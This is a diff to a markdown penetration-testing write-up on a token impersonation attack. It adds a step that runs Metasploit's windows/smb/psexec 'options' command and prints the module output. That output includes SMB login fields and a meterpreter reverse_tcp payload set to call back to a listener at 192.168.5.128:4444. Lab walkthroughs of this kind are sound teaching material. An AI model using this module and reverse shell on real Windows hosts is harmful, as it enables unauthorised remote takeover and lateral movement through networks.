@@ -167,6 +167,10 @@ msf > use exploit/windows/smb/psexec
 msf exploit(windows/smb/psexec) >    
 ```
 
+<p align="center">
+  <img src="/writeups/token impersonation attack/images/step1 1.3.png" width="600">
+</p>
+
 **Why it is used:**
 
 * To run commands on a remote Windows system
@@ -184,14 +188,52 @@ The module creates a service on the target Windows system through SMB and runs a
 * Moving to other machines in the same network
 * Working in a lab or testing environment
 
-**Summary:**
+### Step 1.4: Display all available settings for a Metasploit module.
 
-This module is used to run commands on Windows systems remotely through SMB login and take control of the machine.
+```bash
+msf exploit(windows/smb/psexec) > options
+```
 
+**Output:**
 
+```
+msf exploit(windows/smb/psexec) > options
 
+Module options (exploit/windows/smb/psexec):
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
 
+   Used when connecting via an existing SESSION:
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
 
+   Used when making a new connection via RHOSTS:
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      445              no        The target port (TCP)
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+
+Payload options (windows/meterpreter/reverse_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.5.128    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic
+View the full module info with the info, or info -d command.
+```
 
 
 
